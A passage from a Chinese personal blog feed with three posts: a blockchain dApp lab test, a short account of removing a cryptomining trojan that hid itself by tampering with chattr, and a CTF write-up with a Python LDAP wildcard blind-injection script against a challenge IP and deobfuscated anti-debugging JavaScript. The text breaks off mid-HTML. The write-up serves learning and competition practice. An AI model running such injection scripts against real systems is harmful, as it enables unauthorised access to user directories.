<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//学习conflist/index.js该位置代码进行实现。</span></span><br><span class="line">    <span class="comment">//先执行一遍查询操作</span></span><br><span class="line">    contract.methods.queryMyConf()</span><br><span class="line">    .call(&#123;<span class="attr">from</span>:<span class="built_in">window</span>.web3.eth.accounts[<span class="number">0</span>]&#125;,<span class="function">(<span class="params">err,res</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//将返回的数组依次压入data中</span></span><br><span class="line">        <span class="built_in">this</span>.setState(&#123;<span class="attr">loading</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span>(res != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;res.length;i=i+<span class="number">1</span>)&#123;</span><br><span class="line">                data.push(&#123;<span class="string">&#x27;title&#x27;</span>: res[i]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            data.push(&#123;<span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;no&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//更新状态，使页面数据重新渲染</span></span><br><span class="line">        <span class="built_in">this</span>.setState(&#123;<span class="attr">loading</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后再在<code>contract.js</code>部分填上abi和合约地址，这里不再赘述。</p>
<p>完善前端过后<code>npm build</code>，然后<code>npm start</code>运行此框架。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130203429995.png" alt="image-20211130203429995"></p>
<p>运行成功，并且能打开metamask。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130203616747.png" alt="image-20211130203616747"></p>
<p>下面测试功能，先导入两个账户，私钥从ganache上找到。</p>
<p> <img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130204128153.png" alt="image-20211130204128153"></p>
<p>注册用户：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130204255730.png" alt="image-20211130204255730"></p>
<p>新建title：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130204337550.png" alt="image-20211130204337550"></p>
<p>为我自己报名：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130204422267.png" alt="image-20211130204422267"></p>
<p>支付后：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130204505509.png" alt="image-20211130204505509"></p>
<p>可以看到My Conferences里添加了本次会议。</p>
<p>之后我们用account3注册一个新账号叫1234，截图重复不再展示，委托他报名。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130204652665.png" alt="image-20211130204652665"></p>
<p>执行成功。</p>
]]></content>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>挖矿病毒</title>
    <url>/2021/11/19/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<h1 id="记录一次readworld中的猎马过程"><a href="#记录一次readworld中的猎马过程" class="headerlink" title="记录一次readworld中的猎马过程"></a>记录一次readworld中的猎马过程</h1><p>一次机会能接触到真正的病毒（方式不能说），接触到了一些黑客手法。</p>
<span id="more"></span>
<p>可以看到我们查看每日的定时任务时看到了<code>ntpdate</code>里面，很明显具有病毒特征，运行<code>./mysql</code>向另外一个内网地址发送什么，并且把错误信息全部重定向为空，然后进行自删除。</p>
<p><img src="/2021/11/19/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/assets/image-20211119105532288.png" alt="image-20211119105532288"></p>
<p>再把<code>mysql</code>删了之前，先把这些定时任务取消。<code>lsattr</code>发现又加了i,又加了e.</p>
<p><img src="/2021/11/19/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/assets/image-20211119105600631.png" alt="image-20211119105600631"></p>
<p>chattr的文档：<a href="https://www.computerhope.com/unix/chattr.htm">https://www.computerhope.com/unix/chattr.htm</a></p>
<p>察觉到不对劲，是文件的问题吗？病毒已经猖狂到了这样吗？还是chattr的问题？我们全局搜索一下chattr，除了杀毒软件的EDR下有一个chatrr，在<code>/usr/bin</code>目录下的chattr我们cat发现内容已经为空了，这样我们直接用<code>chattr -ai</code> 就会失败，并且不会进行任何报错。</p>
<p><img src="/2021/11/19/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/assets/image-20211119105821775.png" alt="image-20211119105821775"></p>
<p>知道黑客的手法了，解决办法很简单，用edr的chattr删就好了。</p>
<p><img src="/2021/11/19/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/assets/image-20211119110344126.png" alt="image-20211119110344126"></p>
<p>结束。</p>
<p><img src="/2021/11/19/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/assets/image-20211119110636893.png" alt="image-20211119110636893"></p>
]]></content>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>暗泉杯个人补题wp</title>
    <url>/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/</url>
    <content><![CDATA[<p>打比赛的时候要不是在忙别的，就是在出去玩，就做了一个密码，但是在队友们的血C下拿了一个第四，其中elegant-crazy还在赛后6小时干出一道零解题，在这里贴一下我们的官方wp:<a href="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/">https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</a></p>
<p>然后补了补题，wschat那个题真的把我搞得大残。</p>
<span id="more"></span>
<h2 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h2><p>是一个注入题，但是好像没有发现注入点，fuzz后发现在用户名字段输入括号会有warning回显到前端，发现是使用了ldap协议。</p>
<p>借此机会学习了一下ldap协议，学习资料：<a href="https://www.anquanke.com/post/id/212186">https://www.anquanke.com/post/id/212186</a></p>
<blockquote>
<p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询。</p>
</blockquote>
<p>然后就类似sql注入，有很多注入手法，本题注释里写了一个叫做<code>guest</code>的用户，我们可以用通配符测试一下：发现username为<code>*</code>和<code>g*</code>以及<code>gu*</code>都是能返回用户的，于是做一个简单的布尔盲注就可以，由于有多个用户，写个dfs即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333/?user=&#123;&#125;&amp;pass=1&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">dic = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm1234567890_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        nowpayload = payload + i</span><br><span class="line">        r = requests.get(url.<span class="built_in">format</span>(nowpayload + <span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&quot;用户不唯一&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(nowpayload)</span><br><span class="line">            dfs(nowpayload)</span><br><span class="line"></span><br><span class="line">dfs(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="wschat"><a href="#wschat" class="headerlink" title="wschat"></a>wschat</h2><p>零解题，知识点特别简单：前端绕过+sql注入，没了，但之所以是零解题，那必然是有自己的恶心之处。</p>
<p>首先需要看懂这个前端经过简单混淆的js代码，经过机器美化以及我的美化，最终长这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> gotoNewOfflinePage = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> y$$ = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">R, create</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">const</span> voronoi = y$$ ? <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (create) &#123;</span><br><span class="line">          <span class="keyword">const</span> fn3 = create[<span class="string">&quot;apply&quot;</span>](R, <span class="built_in">arguments</span>);</span><br><span class="line">          <span class="keyword">return</span> create = <span class="literal">null</span>, fn3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> y$$ = <span class="literal">false</span>, voronoi;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;();</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    gotoNewOfflinePage(<span class="built_in">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">const</span> PL$<span class="number">37</span> = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;function *\\( *\\)&quot;</span>);</span><br><span class="line">      <span class="keyword">const</span> PL$<span class="number">26</span> = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)&quot;</span>, <span class="string">&quot;i&quot;</span>);</span><br><span class="line">      <span class="keyword">const</span> PL$<span class="number">36</span> = _0x6c017f(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!PL$<span class="number">37.</span>test(PL$<span class="number">36</span> + <span class="string">&quot;chain&quot;</span>) || !PL$<span class="number">26.</span>test(PL$<span class="number">36</span> + <span class="string">&quot;input&quot;</span>)) &#123;</span><br><span class="line">        PL$<span class="number">36</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        _0x6c017f();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">const</span> result = &#123;</span><br><span class="line">    <span class="string">&quot;isOpen&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;orientation&quot;</span> : <span class="literal">undefined</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> _0x14edab = <span class="number">160</span>;</span><br><span class="line">  <span class="keyword">const</span> emitEvent = <span class="function">(<span class="params">button, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;devtoolschange&quot;</span>, &#123;</span><br><span class="line">      <span class="string">&quot;detail&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;isOpen&quot;</span> : button,</span><br><span class="line">        <span class="string">&quot;orientation&quot;</span> : value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> load = <span class="function">(<span class="params">&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    emitEvents : fromSubmit = <span class="literal">true</span></span></span></span><br><span class="line"><span class="params"><span class="function">  &#125; = &#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> orientation = <span class="built_in">window</span>.outerWidth - <span class="built_in">window</span>.innerWidth &gt; _0x14edab;</span><br><span class="line">    <span class="keyword">const</span> _0x4ca755 = <span class="built_in">window</span>.outerHeight - <span class="built_in">window</span>.innerHeight &gt; _0x14edab;</span><br><span class="line">    <span class="keyword">const</span> y = orientation ? <span class="string">&quot;vertical&quot;</span> : <span class="string">&quot;horizontal&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(_0x4ca755 &amp;&amp; orientation) &amp;&amp; (<span class="built_in">window</span>[<span class="string">&quot;Firebug&quot;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&quot;Firebug&quot;</span>][<span class="string">&quot;chrome&quot;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&quot;Firebug&quot;</span>][<span class="string">&quot;chrome&quot;</span>][<span class="string">&quot;isInitialized&quot;</span>] || orientation || _0x4ca755)) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((!result[<span class="string">&quot;isOpen&quot;</span>] || result[<span class="string">&quot;orientation&quot;</span>] !== y) &amp;&amp; fromSubmit) &#123;</span><br><span class="line">        emitEvent(<span class="literal">true</span>, y);</span><br><span class="line">      &#125;</span><br><span class="line">      result[<span class="string">&quot;isOpen&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">      result[<span class="string">&quot;orientation&quot;</span>] = y;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (result[<span class="string">&quot;isOpen&quot;</span>] &amp;&amp; fromSubmit) &#123;</span><br><span class="line">        emitEvent(<span class="literal">false</span>, <span class="literal">undefined</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result[<span class="string">&quot;isOpen&quot;</span>] = <span class="literal">false</span>;</span><br><span class="line">      result[<span class="string">&quot;orientation&quot;</span>] = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  load(&#123;</span><br><span class="line">    <span class="string">&quot;emitEvents&quot;</span> : <span class="literal">false</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// setInterval(load, 500);</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">module</span> !== <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="built_in">module</span>[<span class="string">&quot;exports&quot;</span>]) &#123;</span><br><span class="line">    <span class="built_in">module</span>[<span class="string">&quot;exports&quot;</span>] = result;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>[<span class="string">&quot;devtools&quot;</span>] = result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// if (window[&quot;devtools&quot;][&quot;isOpen&quot;] === true) &#123;</span></span><br><span class="line"><span class="comment">//   document[&quot;documentElement&quot;][&quot;innerHTML&quot;] = &quot;Hacker!&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="built_in">window</span>[<span class="string">&quot;addEventListener&quot;</span>](<span class="string">&quot;devtoolschange&quot;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">document</span>[<span class="string">&quot;documentElement&quot;</span>][<span class="string">&quot;innerHTML&quot;</span>] = <span class="string">&quot;Hacker!&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> sock = io.connect(<span class="string">&quot;ws://&quot;</span> + <span class="built_in">window</span>.location.host + <span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> WSMessage;</span><br><span class="line"><span class="keyword">var</span> wsmessage;</span><br><span class="line"><span class="keyword">var</span> buffer;</span><br><span class="line">protobuf.load(<span class="string">&quot;chat.proto&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, def</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  LoginReq = def.lookup(<span class="string">&quot;wschat.chat.LoginReq&quot;</span>);</span><br><span class="line">  RegReq = def.lookup(<span class="string">&quot;wschat.chat.RegReq&quot;</span>);</span><br><span class="line">  ServerRsp = def.lookup(<span class="string">&quot;wschat.chat.ServerRsp&quot;</span>);</span><br><span class="line">  MsgReq = def.lookup(<span class="string">&quot;wschat.chat.MsgReq&quot;</span>);</span><br><span class="line">  LogoutReq = def.lookup(<span class="string">&quot;wschat.chat.LogoutReq&quot;</span>);</span><br><span class="line">&#125;), <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fn = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> htmlAttributes = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;btn1&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> attributes = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;btn2&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> data_layer = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;btn_send&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> list = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> item = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> result = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;txt1&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> hl = <span class="built_in">document</span>.getElementByld(<span class="string">&quot;ul1&quot;</span>);</span><br><span class="line">  htmlAttributes.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = RegReq.create(&#123;</span><br><span class="line">      <span class="string">&quot;username&quot;</span> : list[<span class="string">&quot;value&quot;</span>],</span><br><span class="line">      <span class="string">&quot;password&quot;</span> : item[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> labels = RegReq.encode(buffer).finish();</span><br><span class="line">    sock.emit(<span class="string">&quot;reg&quot;</span>, labels.slice()[<span class="string">&quot;buffer&quot;</span>]);</span><br><span class="line">  &#125;;</span><br><span class="line">  sock.on(<span class="string">&quot;reg_ret&quot;</span>, <span class="function">(<span class="params">err, bbls</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  attributes.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&quot;test&quot;](list[&quot;value&quot;])) &#123;</span></span><br><span class="line">    <span class="comment">//   alert(&quot;用户名不符合规范&quot;);</span></span><br><span class="line">    <span class="comment">//   return;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&quot;test&quot;](item[&quot;value&quot;])) &#123;</span></span><br><span class="line">    <span class="comment">//   alert(&quot;密码不符合规范&quot;);</span></span><br><span class="line">    <span class="comment">//   return;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">var</span> buffer = LoginReq.create(&#123;</span><br><span class="line">      <span class="string">&quot;username&quot;</span> : list[<span class="string">&quot;value&quot;</span>],</span><br><span class="line">      <span class="string">&quot;password&quot;</span> : item[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> labels = LoginReq.encode(buffer).finish();</span><br><span class="line">    sock.emit(<span class="string">&quot;login&quot;</span>, labels.slice()[<span class="string">&quot;buffer&quot;</span>]);</span><br><span class="line">  &#125;;</span><br><span class="line">    sock.on(<span class="string">&quot;login_ret&quot;</span>, <span class="function">(<span class="params">err, bbls</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fn = list[<span class="string">&quot;value&quot;</span>];</span><br><span class="line">      alert(bbls);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  data_layer.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = MsgReq.create(&#123;</span><br><span class="line">      <span class="string">&quot;msg&quot;</span> : result[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> labels = MsgReq.encode(buffer).finish();</span><br><span class="line">    sock.emit(<span class="string">&quot;msg&quot;</span>, labels.slice()[<span class="string">&quot;buffer&quot;</span>]);</span><br><span class="line">  &#125;;</span><br><span class="line">  sock.on(<span class="string">&quot;msg&quot;</span>, <span class="function">(<span class="params">err, isSlidingUp</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> node = <span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span><br><span class="line">    node.innerHTML = <span class="string">&quot;&lt;h3&gt;&quot;</span> + err + <span class="string">&quot;&lt;/h3&gt;&lt;p&gt;&quot;</span> + isSlidingUp + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    hl.appendChild(node);</span><br><span class="line">  &#125;);</span><br><span class="line">  sock.on(<span class="string">&quot;msg_ret&quot;</span>, <span class="function">(<span class="params">err, theLibrary</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      alert(<span class="string">&quot;发送失败：&quot;</span> + theLibrary);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> node = <span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span><br><span class="line">      node.className = <span class="string">&quot;mine&quot;</span>;</span><br><span class="line">      node.innerHTML = <span class="string">&quot;&lt;h3&gt;&quot;</span> + fn + <span class="string">&quot;&lt;/h3&gt;&lt;p&gt;&quot;</span> + result[<span class="string">&quot;value&quot;</span>] + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">      hl.appendChild(node);</span><br><span class="line">      result[<span class="string">&quot;value&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  _0x6c017f();</span><br><span class="line">&#125;, <span class="number">4E3</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x6c017f</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// if (typeof i === &quot;string&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//   return function(err) &#123;</span></span><br><span class="line">    <span class="comment">//   &#125;.constructor(&quot;while (true) &#123;&#125;&quot;).apply(&quot;counter&quot;);</span></span><br><span class="line">    <span class="comment">// &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//   if (i % 20 === 0) &#123;</span></span><br><span class="line">    <span class="comment">//     (function() &#123;</span></span><br><span class="line">    <span class="comment">//       return true;</span></span><br><span class="line">    <span class="comment">//     &#125;).constructor(&quot;debugger&quot;).call(&quot;action&quot;);</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     (function() &#123;</span></span><br><span class="line">    <span class="comment">//       return false;</span></span><br><span class="line">    <span class="comment">//     &#125;).constructor(&quot;debugger&quot;).apply(&quot;stateObject&quot;);</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    next(++i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (event) &#123;</span><br><span class="line">      <span class="keyword">return</span> next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      next(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0xf40179) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码还是比较浅显易懂的，分为几部分：第一部分是反调试，他用了几种常见的手法检测你是否开了F12，比如是devtools，还有浏览器窗口比例等等，采取的对应措施是直接回显<code>hacker</code>，以及在某一个断点无限debug，还有就是在浏览器load的时候直接500，导致的后果就是我火狐直接卡死，这些都是一些反调试手法。第二部分是对于username和passwd的一个过滤，只允许有数字和正常字符。第三部分就是和后端走的<code>sock.io</code>的通讯，我们之后再说。</p>
<p>代码看起来美观，但好像执行不了，这题的patch我们只需要把一些关键部分注释了即可，所以我又回去改原来的代码了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>聊天室<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdn.bootcss.com/socket.io/2.1.1/socket.io.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;protobuf.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.mine</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>:green;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">Body</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">bg.webp</span>);</span></span><br><span class="line"><span class="css">   <span class="attribute">background-repeat</span>:no-repeat;</span></span><br><span class="line"><span class="css">   <span class="attribute">background-size</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css">    </span></span><br><span class="line"><span class="css"><span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">background-color</span>: transparent;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-tag">textarea</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">background-color</span>: transparent;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   密 码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn2&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 